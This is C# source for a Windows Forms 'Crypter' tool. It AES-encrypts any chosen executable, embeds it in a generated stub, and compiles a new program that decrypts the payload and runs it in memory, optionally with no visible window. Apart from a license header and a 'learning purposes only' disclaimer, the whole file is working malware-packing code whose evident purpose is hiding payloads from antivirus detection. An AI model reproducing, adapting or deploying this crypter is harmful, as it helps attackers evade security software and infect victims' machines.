/* Crypter
 * 
 * Copyright (c) 2019 henkje
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 * 
 *        -https://github.com/GHenkje/EasyEncrypt/blob/master/LICENSE-
 *          
 * !!!!!!!!!!!Spreading malware is against the law!!!!!!!!!!!
 * !!!!!!!!!!!!This is for learning purposes only!!!!!!!!!!!!
 */

using System;
using System.IO;
using System.Linq;
using System.Text;
using EasyEncrypt;
using Microsoft.CSharp;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using System.Security.Cryptography;

namespace Crypter
{
    public partial class Crypter : Form
    {
        const string StubCode =
@"
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace NaMeSpAcE
{
    class Program
    {
        private static byte[] programBytes = ___PROGRAM___;//Encrypted bytes of invoked program.
        private static byte[] key = ___KEY___;//Key used to encrypt the program.

        static void Main()
        {
            ExecuteBytes(GetBytes());
        }

        /// <summary>
        /// Decrypt and return the bytes of the invoked program.
        /// </summary>
        /// <returns>The bytes of the program</returns>
        static byte[] GetBytes()
        {
            using (Aes algorithm = Aes.Create())//Create algorithm.
            using (MemoryStream ms = new MemoryStream(programBytes))//Create memory stream with program bytes.
            {
                byte[] IV = new byte[algorithm.IV.Length];
                ms.Read(IV, 0, IV.Length);//Get IV from ms. (first 16 bytes)

                using (CryptoStream cs = new CryptoStream(ms, algorithm.CreateDecryptor(key, IV), CryptoStreamMode.Read))
                {
                    byte[] decrypted = new byte[ms.Length];
                    int byteCount = cs.Read(decrypted, 0, (int)ms.Length);

                    byte[] decryptedData = new byte[byteCount];
                    Buffer.BlockCopy(decrypted, 0, decryptedData, 0, byteCount);
                    return decryptedData;
                }
            }
        }

        /// <summary>
        /// Invoke the bytes of the program into the stub.
        /// </summary>
        /// <param name=""Data"">Bytes of the invoked program</param>
        static void ExecuteBytes(byte[] Data)
        {
            //Create assembly of the Data.
            Assembly Assembly = Assembly.Load(Data);

            //Get the entry point of the program.
            MethodInfo method = Assembly.EntryPoint;

            //Run the application from starting point.
            method.Invoke(Assembly.CreateInstance(method.Name), null);
        }
    }
}
";

        public Crypter()=> InitializeComponent();

        private void Build_Click(object sender, EventArgs e)
        {
            if (!File.Exists(path.Text))
            {
                MessageBox.Show("No file selected.");
                return;
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog() { Filter = "Executable files (*.exe)|*.exe" })
            {
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    /*                                                          Set up the compiler.                                                          */
                    CSharpCodeProvider csc = new CSharpCodeProvider();
                    CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" }, saveFileDialog.FileName) { GenerateExecutable = true };
                    if (winexe.Checked)
                        parameters.CompilerOptions = "/target:winexe";

                    /*                                                          Set up the code.                                                          */
                    string code = StubCode;

                    byte[] encryptionKey = Aes.Create().Key;
                    code = code.Replace("___KEY___", ByteArrayToString(encryptionKey));

                    byte[] programBytes = File.ReadAllBytes(path.Text);
                    byte[] encryptedProgramBytes = new Encryption(Aes.Create(), encryptionKey).Encrypt(programBytes);

                    code = code.Replace("___PROGRAM___", ByteArrayToString(encryptedProgramBytes));

                    /*                                                          Compile the code.                                                          */
                    CompilerResults Results = csc.CompileAssemblyFromSource(parameters, code);
                    Results.Errors.Cast<CompilerError>().ToList().ForEach(Error => MessageBox.Show(Error.ErrorText));//Display errors.
                }
            }
        }

        private void Search_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog OpenFileDialog1 = new OpenFileDialog())
                if (OpenFileDialog1.ShowDialog() == DialogResult.OK)
                    path.Text = OpenFileDialog1.FileName;
        }

        /// <summary>
        /// Converts a byte[] into code format: "new byte[]{12,54,12}"
        /// </summary>
        /// <param name="Array"></param>
        /// <returns>byte[] in code format</returns>
        private string ByteArrayToString(byte[] Array)
        {
            StringBuilder builder = new StringBuilder();
            builder.Append("new byte[] {");

            foreach (byte b in Array)
            {
                builder.Append(b);
                builder.Append(',');
            }

            builder.Length -= 1;//Remove last ','
            builder.Append("}");

            return builder.ToString();
        }
    }
}
